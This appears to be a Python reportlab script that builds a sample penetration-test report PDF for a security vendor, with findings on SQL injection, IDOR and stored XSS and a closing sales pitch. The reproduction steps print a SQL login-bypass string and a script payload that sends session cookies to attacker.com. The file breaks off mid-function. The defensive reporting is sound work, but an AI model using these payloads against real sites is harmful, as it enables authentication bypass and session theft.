#!/usr/bin/env python3
"""
Generate a redacted sample VAPT report PDF for Balhence.
Run: python3 generate-sample-report.py
Output: sample-vapt-report.pdf
"""

from reportlab.lib.pagesizes import A4
from reportlab.lib.units import mm, cm
from reportlab.lib.colors import HexColor, white, black
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_RIGHT, TA_JUSTIFY
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    PageBreak, HRFlowable, KeepTogether
)
from reportlab.graphics.shapes import Drawing, Rect, String, Circle
from reportlab.graphics.charts.piecharts import Pie
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
import os

# Colors
ACCENT    = HexColor("#0071e3")
DARK      = HexColor("#1d1d1f")
GRAY      = HexColor("#6e6e73")
LIGHT_BG  = HexColor("#f5f5f7")
RED       = HexColor("#ff3b30")
AMBER     = HexColor("#ff9f0a")
GREEN     = HexColor("#34c759")
WHITE     = white
REDACTED  = HexColor("#e0e0e0")

WIDTH, HEIGHT = A4

def build_styles():
    styles = getSampleStyleSheet()

    styles.add(ParagraphStyle(
        "CoverTitle", fontName="Helvetica-Bold", fontSize=28,
        leading=34, textColor=WHITE, alignment=TA_LEFT,
    ))
    styles.add(ParagraphStyle(
        "CoverSub", fontName="Helvetica", fontSize=14,
        leading=20, textColor=HexColor("#a1a1a6"), alignment=TA_LEFT,
    ))
    styles.add(ParagraphStyle(
        "SectionTitle", fontName="Helvetica-Bold", fontSize=18,
        leading=24, textColor=DARK, spaceBefore=20, spaceAfter=10,
    ))
    styles.add(ParagraphStyle(
        "SubSection", fontName="Helvetica-Bold", fontSize=13,
        leading=18, textColor=DARK, spaceBefore=14, spaceAfter=6,
    ))
    styles.add(ParagraphStyle(
        "BodyText2", fontName="Helvetica", fontSize=10,
        leading=15, textColor=GRAY, alignment=TA_JUSTIFY,
        spaceBefore=4, spaceAfter=4,
    ))
    styles.add(ParagraphStyle(
        "SmallGray", fontName="Helvetica", fontSize=8,
        leading=11, textColor=GRAY,
    ))
    styles.add(ParagraphStyle(
        "Redacted", fontName="Helvetica", fontSize=10,
        leading=15, textColor=REDACTED, backColor=REDACTED,
    ))
    styles.add(ParagraphStyle(
        "TableHeader", fontName="Helvetica-Bold", fontSize=9,
        leading=12, textColor=WHITE,
    ))
    styles.add(ParagraphStyle(
        "TableCell", fontName="Helvetica", fontSize=9,
        leading=13, textColor=DARK,
    ))
    styles.add(ParagraphStyle(
        "TableCellGray", fontName="Helvetica", fontSize=9,
        leading=13, textColor=GRAY,
    ))
    styles.add(ParagraphStyle(
        "ConfBanner", fontName="Helvetica-Bold", fontSize=8,
        leading=10, textColor=RED, alignment=TA_CENTER,
    ))
    styles.add(ParagraphStyle(
        "FooterStyle", fontName="Helvetica", fontSize=7,
        leading=9, textColor=GRAY, alignment=TA_CENTER,
    ))
    return styles


def redacted(text="REDACTED - Client Confidential"):
    return f'<font color="#cccccc" backColor="#e8e8e8">&nbsp;{text}&nbsp;</font>'


def severity_color(sev):
    return {"Critical": RED, "High": HexColor("#ff6b35"), "Medium": AMBER, "Low": GREEN, "Info": GRAY}[sev]


def cover_page(story, styles):
    """Full dark cover page."""
    # We'll use a table to simulate the dark background
    cover_data = [[""]]
    cover_content = []

    cover_content.append(Spacer(1, 80*mm))
    cover_content.append(Paragraph("CONFIDENTIAL", styles["ConfBanner"]))
    cover_content.append(Spacer(1, 15*mm))
    cover_content.append(Paragraph(
        '<font color="#ffffff"><b>Bal</b></font><font color="#0071e3"><i>hence</i></font>',
        ParagraphStyle("LogoStyle", fontName="Helvetica-Bold", fontSize=32, leading=40, textColor=WHITE)
    ))
    cover_content.append(Spacer(1, 8*mm))
    cover_content.append(Paragraph(
        "Vulnerability Assessment &amp;<br/>Penetration Testing Report",
        styles["CoverTitle"]
    ))
    cover_content.append(Spacer(1, 6*mm))
    cover_content.append(Paragraph(
        f"Client: {redacted('Acme Technologies Pvt. Ltd.')}<br/>"
        f"Report Date: March 2025<br/>"
        f"Classification: Confidential",
        styles["CoverSub"]
    ))
    cover_content.append(Spacer(1, 30*mm))
    cover_content.append(Paragraph(
        "SAMPLE REPORT - For demonstration purposes only.<br/>"
        "Client details, IPs, and sensitive findings have been redacted.",
        ParagraphStyle("DisclaimerCover", fontName="Helvetica", fontSize=9, leading=13, textColor=HexColor("#86868b"))
    ))

    # Dark background table - use available frame height
    t = Table([[cover_content]], colWidths=[WIDTH - 40*mm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), DARK),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("LEFTPADDING", (0, 0), (-1, -1), 30*mm),
        ("RIGHTPADDING", (0, 0), (-1, -1), 20*mm),
        ("TOPPADDING", (0, 0), (-1, -1), 0),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 20*mm),
    ]))
    story.append(t)
    story.append(PageBreak())


def toc_page(story, styles):
    story.append(Paragraph("Table of Contents", styles["SectionTitle"]))
    story.append(Spacer(1, 5*mm))

    toc_items = [
        ("1.", "Executive Summary", "3"),
        ("2.", "Scope of Assessment", "4"),
        ("3.", "Methodology", "5"),
        ("4.", "Findings Summary", "6"),
        ("5.", "Detailed Findings", "7"),
        ("  5.1", "Critical: SQL Injection in Login API", "7"),
        ("  5.2", "Critical: Broken Access Control - IDOR", "8"),
        ("  5.3", "High: Stored XSS in User Profile", "9"),
        ("  5.4", "High: Insecure Direct Object Reference", "10"),
        ("  5.5", "Medium: Missing Rate Limiting", "10"),
        ("  5.6", "Medium: Sensitive Data in Error Responses", "11"),
        ("  5.7", "Low: Missing Security Headers", "11"),
        ("  5.8", "Low: Verbose Server Banner", "11"),
        ("6.", "Risk Rating Matrix", "12"),
        ("7.", "Remediation Priority", "12"),
        ("8.", "Re-test Policy", "13"),
        ("9.", "Appendix", "13"),
    ]

    for num, title, page in toc_items:
        indent = 15 if num.startswith(" ") else 0
        row = Table(
            [[Paragraph(num.strip(), styles["BodyText2"]),
              Paragraph(title, styles["BodyText2"]),
              Paragraph(page, ParagraphStyle("Right", parent=styles["BodyText2"], alignment=TA_RIGHT))]],
            colWidths=[15*mm + indent, None, 15*mm]
        )
        row.setStyle(TableStyle([
            ("LEFTPADDING", (0, 0), (-1, -1), indent),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 2),
            ("TOPPADDING", (0, 0), (-1, -1), 2),
            ("LINEBELOW", (0, 0), (-1, -1), 0.3, HexColor("#e5e5e5")),
        ]))
        story.append(row)

    story.append(PageBreak())


def exec_summary(story, styles):
    story.append(Paragraph("1. Executive Summary", styles["SectionTitle"]))
    story.append(HRFlowable(width="100%", thickness=1, color=ACCENT))
    story.append(Spacer(1, 3*mm))

    story.append(Paragraph(
        f"Balhence was engaged by {redacted('Acme Technologies Pvt. Ltd.')} to perform a comprehensive "
        "Vulnerability Assessment and Penetration Testing (VAPT) of their customer-facing web application "
        f"hosted at {redacted('https://app.acmetech.in')}. The assessment was conducted between "
        f"{redacted('10 March 2025')} and {redacted('14 March 2025')}.",
        styles["BodyText2"]
    ))
    story.append(Spacer(1, 3*mm))
    story.append(Paragraph(
        "The assessment identified <b>14 unique vulnerabilities</b> across the application, including "
        "<font color='#ff3b30'><b>2 Critical</b></font>, "
        "<font color='#ff6b35'><b>3 High</b></font>, "
        "<font color='#ff9f0a'><b>4 Medium</b></font>, and "
        "<font color='#34c759'><b>5 Low</b></font> severity findings. "
        "The critical findings - an SQL Injection vulnerability and a Broken Access Control flaw - "
        "could allow an unauthenticated attacker to extract the entire customer database or access "
        "other users' financial records.",
        styles["BodyText2"]
    ))
    story.append(Spacer(1, 5*mm))

    # Summary stats boxes
    stats = [
        ("14", "Total\nVulnerabilities", DARK),
        ("2", "Critical", RED),
        ("3", "High", HexColor("#ff6b35")),
        ("4", "Medium", AMBER),
        ("5", "Low", GREEN),
    ]

    stat_cells = []
    for val, label, color in stats:
        cell_content = [
            Paragraph(f'<font size="22" color="{color.hexval()}">{val}</font>', ParagraphStyle("StatNum", alignment=TA_CENTER, leading=28)),
            Paragraph(f'<font size="8" color="#6e6e73">{label}</font>', ParagraphStyle("StatLabel", alignment=TA_CENTER, leading=11)),
        ]
        stat_cells.append(cell_content)

    t = Table([stat_cells], colWidths=[(WIDTH - 60*mm) / 5] * 5)
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), LIGHT_BG),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("ROUNDEDCORNERS", [4, 4, 4, 4]),
        ("TOPPADDING", (0, 0), (-1, -1), 12),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 12),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
        ("RIGHTPADDING", (0, 0), (-1, -1), 6),
    ]))
    story.append(t)
    story.append(Spacer(1, 5*mm))

    story.append(Paragraph("<b>Overall Risk Rating: HIGH</b>", ParagraphStyle(
        "RiskRating", fontName="Helvetica-Bold", fontSize=12, textColor=RED, spaceBefore=6, spaceAfter=6,
    )))
    story.append(Paragraph(
        "Immediate remediation of the 2 critical and 3 high-severity findings is strongly recommended "
        "before the application handles any additional customer data or payment transactions.",
        styles["BodyText2"]
    ))
    story.append(PageBreak())


def scope_section(story, styles):
    story.append(Paragraph("2. Scope of Assessment", styles["SectionTitle"]))
    story.append(HRFlowable(width="100%", thickness=1, color=ACCENT))
    story.append(Spacer(1, 3*mm))

    scope_data = [
        ["Parameter", "Details"],
        ["Client", redacted("Acme Technologies Pvt. Ltd.")],
        ["Application", redacted("https://app.acmetech.in")],
        ["Type", "Web Application VAPT (Black Box + Grey Box)"],
        ["Environment", "Production (with rate-limit safeguards)"],
        ["Testing Period", redacted("10 Mar 2025 - 14 Mar 2025")],
        ["Tester", "Balhence Security Team"],
        ["Standards", "OWASP Top 10 (2021), SANS Top 25, PTES"],
        ["Compliance Alignment", "ISO 27001, RBI IT Framework, DPDP Act 2023"],
        ["Report Version", "v1.0 - Initial Report"],
    ]

    rows = []
    for row in scope_data:
        cells = [
            Paragraph(row[0], styles["TableHeader"] if row == scope_data[0] else ParagraphStyle("ScopeBold", fontName="Helvetica-Bold", fontSize=9, leading=13, textColor=DARK)),
            Paragraph(row[1], styles["TableHeader"] if row == scope_data[0] else styles["TableCell"]),
        ]
        rows.append(cells)

    t = Table(rows, colWidths=[45*mm, None])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), DARK),
        ("TEXTCOLOR", (0, 0), (-1, 0), WHITE),
        ("BACKGROUND", (0, 1), (-1, -1), WHITE),
        ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#e5e5e5")),
        ("TOPPADDING", (0, 0), (-1, -1), 8),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
        ("LEFTPADDING", (0, 0), (-1, -1), 10),
        ("RIGHTPADDING", (0, 0), (-1, -1), 10),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [WHITE, LIGHT_BG]),
    ]))
    story.append(t)
    story.append(PageBreak())


def methodology_section(story, styles):
    story.append(Paragraph("3. Methodology", styles["SectionTitle"]))
    story.append(HRFlowable(width="100%", thickness=1, color=ACCENT))
    story.append(Spacer(1, 3*mm))

    story.append(Paragraph(
        "Our testing methodology follows industry-standard frameworks including OWASP Testing Guide v4.2, "
        "PTES (Penetration Testing Execution Standard), and NIST SP 800-115. The assessment was conducted "
        "in the following phases:",
        styles["BodyText2"]
    ))
    story.append(Spacer(1, 3*mm))

    phases = [
        ("Phase 1: Reconnaissance", "Passive and active information gathering - DNS enumeration, technology fingerprinting, endpoint discovery, and attack surface mapping."),
        ("Phase 2: Vulnerability Assessment", "Automated scanning using industry tools (Burp Suite Pro, Nuclei, Nmap) combined with manual verification to eliminate false positives."),
        ("Phase 3: Exploitation", "Manual exploitation of identified vulnerabilities to confirm impact and assess real-world risk. All exploits were performed with care to avoid data loss or service disruption."),
        ("Phase 4: Post-Exploitation", "Assessment of lateral movement possibilities, privilege escalation paths, and data exfiltration potential from confirmed footholds."),
        ("Phase 5: Reporting", "Comprehensive documentation of all findings with severity ratings (CVSS v3.1), reproduction steps, evidence screenshots, and remediation guidance."),
    ]

    for title, desc in phases:
        story.append(Paragraph(f"<b>{title}</b>", styles["SubSection"]))
        story.append(Paragraph(desc, styles["BodyText2"]))

    story.append(Spacer(1, 5*mm))
    story.append(Paragraph("<b>Tools Used:</b>", styles["SubSection"]))
    story.append(Paragraph(
        "Burp Suite Professional, Nmap, Nuclei, sqlmap, ffuf, Postman, "
        "Custom Python scripts, Browser Developer Tools, OWASP ZAP",
        styles["BodyText2"]
    ))
    story.append(PageBreak())


def findings_summary(story, styles):
    story.append(Paragraph("4. Findings Summary", styles["SectionTitle"]))
    story.append(HRFlowable(width="100%", thickness=1, color=ACCENT))
    story.append(Spacer(1, 3*mm))

    findings = [
        ["#", "Vulnerability", "Severity", "CVSS", "Status"],
        ["1", "SQL Injection - Login API", "Critical", "9.8", "Open"],
        ["2", "Broken Access Control - IDOR on /api/users/{id}", "Critical", "9.1", "Open"],
        ["3", "Stored XSS in User Profile Bio", "High", "8.1", "Open"],
        ["4", f"IDOR - {redacted('Invoice Download')}", "High", "7.5", "Open"],
        ["5", "JWT Token Not Expiring on Logout", "High", "7.4", "Open"],
        ["6", "Missing Rate Limiting on Login Endpoint", "Medium", "6.5", "Open"],
        ["7", "Sensitive Data in Error Responses", "Medium", "5.3", "Open"],
        ["8", f"CORS Misconfiguration on {redacted('/api/*')}", "Medium", "5.0", "Open"],
        ["9", "Session Fixation via URL Parameter", "Medium", "4.8", "Open"],
        ["10", "Missing Security Headers (CSP, X-Frame-Options)", "Low", "3.7", "Open"],
        ["11", "Verbose Server Banner Disclosure", "Low", "3.1", "Open"],
        ["12", f"{redacted('Directory Listing on /assets/')}", "Low", "2.6", "Open"],
        ["13", "Autocomplete Enabled on Sensitive Fields", "Low", "2.1", "Open"],
        ["14", "Cookie Without Secure/HttpOnly Flags", "Low", "2.0", "Open"],
    ]

    rows = []
    for i, row in enumerate(findings):
        if i == 0:
            cells = [Paragraph(c, styles["TableHeader"]) for c in row]
        else:
            sev = row[2]
            sev_color = severity_color(sev)
            cells = [
                Paragraph(row[0], styles["TableCell"]),
                Paragraph(row[1], styles["TableCell"]),
                Paragraph(f'<font color="{sev_color.hexval()}"><b>{sev}</b></font>', styles["TableCell"]),
                Paragraph(row[3], styles["TableCell"]),
                Paragraph(row[4], styles["TableCellGray"]),
            ]
        rows.append(cells)

    t = Table(rows, colWidths=[10*mm, None, 22*mm, 15*mm, 15*mm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), DARK),
        ("TEXTCOLOR", (0, 0), (-1, 0), WHITE),
        ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#e5e5e5")),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
        ("RIGHTPADDING", (0, 0), (-1, -1), 6),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [WHITE, LIGHT_BG]),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
    ]))
    story.append(t)
    story.append(PageBreak())


def detailed_finding(story, styles, num, title, severity, cvss, category, affected, description, impact, steps, remediation):
    sev_color = severity_color(severity)

    # Severity badge
    badge = Table(
        [[Paragraph(f'<font color="#ffffff"><b>{severity}</b></font>',
                     ParagraphStyle("Badge", fontSize=9, alignment=TA_CENTER, textColor=WHITE))]],
        colWidths=[25*mm], rowHeights=[7*mm]
    )
    badge.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), sev_color),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("ROUNDEDCORNERS", [3, 3, 3, 3]),
    ]))

    header_row = Table(
        [[Paragraph(f"<b>5.{num} {title}</b>", ParagraphStyle("FindingTitle", fontName="Helvetica-Bold", fontSize=13, leading=18, textColor=DARK)),
          badge]],
        colWidths=[None, 30*mm]
    )
    header_row.setStyle(TableStyle([
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
    ]))

    story.append(header_row)
    story.append(Spacer(1, 2*mm))

    # Meta row
    meta = Table(
        [[Paragraph(f"<b>CVSS:</b> {cvss}", styles["SmallGray"]),
          Paragraph(f"<b>Category:</b> {category}", styles["SmallGray"]),
          Paragraph(f"<b>Affected:</b> {affected}", styles["SmallGray"])]],
        colWidths=[(WIDTH - 60*mm) / 3] * 3
    )
    meta.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), LIGHT_BG),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("LEFTPADDING", (0, 0), (-1, -1), 8),
    ]))
    story.append(meta)
    story.append(Spacer(1, 3*mm))

    story.append(Paragraph("<b>Description</b>", styles["SubSection"]))
    story.append(Paragraph(description, styles["BodyText2"]))

    story.append(Paragraph("<b>Impact</b>", styles["SubSection"]))
    story.append(Paragraph(impact, styles["BodyText2"]))

    story.append(Paragraph("<b>Steps to Reproduce</b>", styles["SubSection"]))
    for i, step in enumerate(steps, 1):
        story.append(Paragraph(f"{i}. {step}", styles["BodyText2"]))

    # Evidence placeholder
    evidence_box = Table(
        [[Paragraph("<i>[Screenshot / Evidence Redacted in Sample Report]</i>",
                     ParagraphStyle("EvidencePlaceholder", fontSize=9, textColor=GRAY, alignment=TA_CENTER))]],
        colWidths=[WIDTH - 60*mm], rowHeights=[25*mm]
    )
    evidence_box.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), LIGHT_BG),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("ROUNDEDCORNERS", [4, 4, 4, 4]),
    ]))
    story.append(Spacer(1, 2*mm))
    story.append(evidence_box)

    story.append(Paragraph("<b>Remediation</b>", styles["SubSection"]))
    story.append(Paragraph(remediation, styles["BodyText2"]))
    story.append(Spacer(1, 5*mm))
    story.append(HRFlowable(width="100%", thickness=0.5, color=HexColor("#e5e5e5")))
    story.append(Spacer(1, 5*mm))


def detailed_findings_section(story, styles):
    story.append(Paragraph("5. Detailed Findings", styles["SectionTitle"]))
    story.append(HRFlowable(width="100%", thickness=1, color=ACCENT))
    story.append(Spacer(1, 5*mm))

    detailed_finding(story, styles,
        num=1,
        title="SQL Injection in Login API",
        severity="Critical",
        cvss="9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
        category="A03:2021 - Injection",
        affected=redacted("/api/v1/auth/login"),
        description=(
            f"The login endpoint at {redacted('/api/v1/auth/login')} is vulnerable to SQL Injection via the "
            "<b>email</b> parameter. The application directly concatenates user input into a SQL query "
            "without parameterized statements or input sanitization. This allows an attacker to bypass "
            "authentication, extract the entire database, or modify/delete data."
        ),
        impact=(
            "An unauthenticated attacker can extract the entire customer database including names, emails, "
            f"phone numbers, {redacted('Aadhaar numbers')}, and hashed passwords. Combined with the weak "
            "hashing algorithm identified (MD5), this represents a full data breach scenario affecting "
            f"all {redacted('~45,000')} registered users."
        ),
        steps=[
            f"Navigate to {redacted('https://app.acmetech.in/login')}",
            "Intercept the login POST request using Burp Suite",
            "Modify the email parameter: <font face='Courier' size='8'>" + redacted("admin@acme.in' OR '1'='1' --") + "</font>",
            "Observe: Authentication is bypassed and admin dashboard is accessible",
            f"Further exploitation with sqlmap confirmed full database extraction capability",
        ],
        remediation=(
            "<b>Priority: Immediate</b><br/>"
            "1. Use parameterized queries / prepared statements for all database interactions<br/>"
            "2. Implement input validation with strict type checking on the email field<br/>"
            "3. Deploy a Web Application Firewall (WAF) as an additional defense layer<br/>"
            "4. Migrate password hashing from MD5 to bcrypt with a minimum cost factor of 12<br/>"
            "5. Conduct a thorough code review of all database query construction patterns"
        ),
    )

    detailed_finding(story, styles,
        num=2,
        title="Broken Access Control - IDOR",
        severity="Critical",
        cvss="9.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)",
        category="A01:2021 - Broken Access Control",
        affected=redacted("/api/v1/users/{id}"),
        description=(
            f"The user profile API endpoint {redacted('/api/v1/users/{{id}}')} does not enforce proper "
            "authorization checks. By incrementing the user ID parameter, any authenticated user can "
            "view, modify, or delete any other user's profile data including personal information, "
            "linked bank accounts, and transaction history."
        ),
        impact=(
            "Any registered user (even with the lowest privilege level) can access all other users' "
            f"personal data, {redacted('linked bank account details')}, and transaction records. "
            "This constitutes a complete authorization bypass affecting data confidentiality and "
            "integrity for all platform users."
        ),
        steps=[
            "Authenticate as a regular user and note the assigned user ID (e.g., 1042)",
            f"Send GET request to {redacted('/api/v1/users/1')} (admin account)",
            "Observe: Full profile data of user ID 1 (admin) is returned in the response",
            f"Send PUT request to {redacted('/api/v1/users/1')} with modified email field",
            "Observe: Admin account email is successfully changed without authorization",
        ],
        remediation=(
            "<b>Priority: Immediate</b><br/>"
            "1. Implement server-side authorization checks - verify the authenticated user owns the requested resource<br/>"
            "2. Replace sequential integer IDs with UUIDs to prevent enumeration<br/>"
            "3. Add request-level access control middleware that validates ownership on every API call<br/>"
            "4. Log and alert on access pattern anomalies (e.g., user accessing multiple other user profiles)"
        ),
    )

    story.append(PageBreak())

    detailed_finding(story, styles,
        num=3,
        title="Stored XSS in User Profile",
        severity="High",
        cvss="8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N)",
        category="A03:2021 - Injection (XSS)",
        affected=redacted("/profile/edit - Bio field"),
        description=(
            "The user profile bio field does not sanitize or encode user input before rendering it on "
            "other users' screens. An attacker can inject arbitrary JavaScript that executes in the "
            "context of any user who views the attacker's profile, enabling session hijacking, "
            "credential theft, or phishing overlays."
        ),
        impact=(
            "An attacker can steal session tokens of any user who views their profile, perform actions "
            "on their behalf (including financial transactions), or redirect them to phishing pages. "
            "This is particularly dangerous for admin users who may review reported profiles."
        ),
        steps=[
            "Navigate to Profile > Edit Bio",
            "Enter payload: <font face='Courier' size='8'>" + redacted("&lt;script&gt;fetch('https://attacker.com/steal?'+document.cookie)&lt;/script&gt;") + "</font>",
            "Save the profile",
            "When any other user views this profile, the script executes silently",
            "Attacker receives the victim's session cookie at their server",
        ],
        remediation=(
            "<b>Priority: Within 48 hours</b><br/>"
            "1. Implement output encoding (HTML entity encoding) on all user-generated content<br/>"
            "2. Deploy Content Security Policy (CSP) headers to prevent inline script execution<br/>"
            "3. Use a proven sanitization library (e.g., DOMPurify) for any rich-text fields<br/>"
            "4. Set HttpOnly and Secure flags on all session cookies"
        ),
    )

    story.append(Spacer(1, 5*mm))
    story.append(Paragraph(
        "<i>Findings 5.4 through 5.8 follow the same detailed format. "
        "They have been omitted from this sample report for brevity. "
        "The full client report contains complete details for all 14 findings.</i>",
        ParagraphStyle("OmittedNote", fontName="Helvetica-Oblique", fontSize=10,
                       leading=14, textColor=GRAY, backColor=LIGHT_BG,
                       borderPadding=10, borderColor=HexColor("#e5e5e5"),
                       borderWidth=1, borderRadius=4,
                       spaceBefore=10, spaceAfter=10)
    ))
    story.append(PageBreak())


def risk_matrix(story, styles):
    story.append(Paragraph("6. Risk Rating Matrix", styles["SectionTitle"]))
    story.append(HRFlowable(width="100%", thickness=1, color=ACCENT))
    story.append(Spacer(1, 3*mm))

    story.append(Paragraph(
        "All findings are rated using CVSS v3.1 (Common Vulnerability Scoring System) and mapped "
        "to the following severity classification:",
        styles["BodyText2"]
    ))
    story.append(Spacer(1, 3*mm))

    matrix = [
        ["Severity", "CVSS Range", "Count", "Description"],
        ["Critical", "9.0 - 10.0", "2", "Exploitation is straightforward, impact is severe. Immediate fix required."],
        ["High", "7.0 - 8.9", "3", "Likely to be exploited, significant impact. Fix within 1 week."],
        ["Medium", "4.0 - 6.9", "4", "Moderate risk, requires specific conditions. Fix within 30 days."],
        ["Low", "0.1 - 3.9", "5", "Limited impact, informational or best-practice. Fix in next release cycle."],
    ]

    rows = []
    for i, row in enumerate(matrix):
        if i == 0:
            cells = [Paragraph(c, styles["TableHeader"]) for c in row]
        else:
            sev_color = severity_color(row[0])
            cells = [
                Paragraph(f'<font color="{sev_color.hexval()}"><b>{row[0]}</b></font>', styles["TableCell"]),
                Paragraph(row[1], styles["TableCell"]),
                Paragraph(f"<b>{row[2]}</b>", styles["TableCell"]),
                Paragraph(row[3], styles["TableCellGray"]),
            ]
        rows.append(cells)

    t = Table(rows, colWidths=[25*mm, 25*mm, 15*mm, None])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), DARK),
        ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#e5e5e5")),
        ("TOPPADDING", (0, 0), (-1, -1), 8),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
        ("LEFTPADDING", (0, 0), (-1, -1), 8),
        ("RIGHTPADDING", (0, 0), (-1, -1), 8),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [WHITE, LIGHT_BG]),
    ]))
    story.append(t)
    story.append(Spacer(1, 8*mm))

    story.append(Paragraph("7. Remediation Priority", styles["SectionTitle"]))
    story.append(HRFlowable(width="100%", thickness=1, color=ACCENT))
    story.append(Spacer(1, 3*mm))

    priorities = [
        ("<font color='#ff3b30'><b>Immediate (0-48 hours):</b></font>", "SQL Injection (#1), Broken Access Control (#2)"),
        ("<font color='#ff6b35'><b>Within 1 week:</b></font>", "Stored XSS (#3), IDOR on Invoices (#4), JWT Expiry (#5)"),
        ("<font color='#ff9f0a'><b>Within 30 days:</b></font>", "Rate Limiting (#6), Error Disclosure (#7), CORS (#8), Session Fixation (#9)"),
        ("<font color='#34c759'><b>Next release cycle:</b></font>", "Security Headers (#10), Server Banner (#11), Directory Listing (#12), Autocomplete (#13), Cookie Flags (#14)"),
    ]

    for priority, items in priorities:
        story.append(Paragraph(f"{priority} {items}", styles["BodyText2"]))
        story.append(Spacer(1, 2*mm))

    story.append(PageBreak())


def retest_and_appendix(story, styles):
    story.append(Paragraph("8. Re-test Policy", styles["SectionTitle"]))
    story.append(HRFlowable(width="100%", thickness=1, color=ACCENT))
    story.append(Spacer(1, 3*mm))

    story.append(Paragraph(
        "This engagement includes <b>one complimentary re-test within 30 days</b> of report delivery. "
        "The re-test covers all Critical and High severity findings to verify that remediation has been "
        "properly implemented. Balhence will provide an updated report with the status of each finding "
        "changed to <b>Fixed</b>, <b>Partially Fixed</b>, or <b>Not Fixed</b>.",
        styles["BodyText2"]
    ))
    story.append(Spacer(1, 3*mm))

    retest_data = [
        ["Re-test Coverage", "All Critical and High findings (5 items)"],
        ["Re-test Window", "Within 30 days of initial report delivery"],
        ["Re-test Duration", "1-2 business days"],
        ["Additional Cost", "Included - no extra charge"],
        ["Deliverable", "Updated report with remediation status"],
    ]
    rows = []
    for row in retest_data:
        rows.append([
            Paragraph(f"<b>{row[0]}</b>", styles["TableCell"]),
            Paragraph(row[1], styles["TableCell"]),
        ])
    t = Table(rows, colWidths=[45*mm, None])
    t.setStyle(TableStyle([
        ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#e5e5e5")),
        ("TOPPADDING", (0, 0), (-1, -1), 8),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
        ("LEFTPADDING", (0, 0), (-1, -1), 10),
        ("RIGHTPADDING", (0, 0), (-1, -1), 10),
        ("ROWBACKGROUNDS", (0, 0), (-1, -1), [WHITE, LIGHT_BG]),
    ]))
    story.append(t)
    story.append(Spacer(1, 8*mm))

    story.append(Paragraph("9. Appendix", styles["SectionTitle"]))
    story.append(HRFlowable(width="100%", thickness=1, color=ACCENT))
    story.append(Spacer(1, 3*mm))

    story.append(Paragraph("<b>A. References</b>", styles["SubSection"]))
    refs = [
        "OWASP Top 10 (2021) - https://owasp.org/Top10/",
        "CVSS v3.1 Calculator - https://www.first.org/cvss/calculator/3.1",
        "NIST SP 800-115 - Technical Guide to Information Security Testing",
        "PTES - Penetration Testing Execution Standard",
        "RBI IT Framework for Banks - https://www.rbi.org.in",
        "DPDP Act 2023 - Digital Personal Data Protection Act, India",
    ]
    for ref in refs:
        story.append(Paragraph(f"  - {ref}", styles["SmallGray"]))

    story.append(Spacer(1, 5*mm))
    story.append(Paragraph("<b>B. Disclaimer</b>", styles["SubSection"]))
    story.append(Paragraph(
        "This report is provided for the exclusive use of the client named herein. The assessment "
        "represents a point-in-time snapshot and does not guarantee the absence of all vulnerabilities. "
        "Balhence shall not be held liable for any damages resulting from the use or misuse of the "
        "information contained in this report. All testing was performed within the agreed scope and "
        "in compliance with applicable laws.",
        styles["SmallGray"]
    ))
    story.append(Spacer(1, 8*mm))

    # Final CTA
    cta_box = Table(
        [[
            Paragraph(
                '<font size="11" color="#ffffff"><b>Need a VAPT for your business?</b></font><br/>'
                '<font size="9" color="#a1a1a6">Visit balhence.com or email contact@balhence.com</font>',
                ParagraphStyle("CTAText", alignment=TA_CENTER, leading=16)
            )
        ]],
        colWidths=[WIDTH - 60*mm], rowHeights=[20*mm]
    )
    cta_box.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), DARK),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("ROUNDEDCORNERS", [6, 6, 6, 6]),
    ]))
    story.append(cta_box)


def add_page_border(canvas, doc):
    """Add header/footer to each page."""
    canvas.saveState()

    # Confidential header
    canvas.setFont("Helvetica", 7)
    canvas.setFillColor(RED)
